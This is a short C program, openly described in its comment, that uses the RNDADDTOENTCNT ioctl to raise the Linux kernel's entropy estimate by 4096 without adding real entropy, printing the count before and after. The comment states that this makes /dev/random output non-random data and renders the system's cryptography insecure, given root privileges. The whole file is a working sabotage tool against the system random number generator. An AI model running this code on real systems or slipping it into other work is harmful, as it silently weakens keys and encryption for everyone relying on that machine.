/*
 * Increase the kernel's entropy estimate, without actually adding entropy.
 * This will make /dev/random output non-random data, rendering all
 * cryptography stuff done on the system insecure.
 *
 * Needs root privileges.
 */

#include <fcntl.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <linux/random.h>

int main() {
    int have;
    int add = 4096;
    int d = open("/dev/random", O_WRONLY);

    ioctl(d, RNDGETENTCNT, &have);
    printf("before: %d\n", have);

    ioctl(d, RNDADDTOENTCNT, &add);

    ioctl(d, RNDGETENTCNT, &have);
    printf("after: %d\n", have);
}
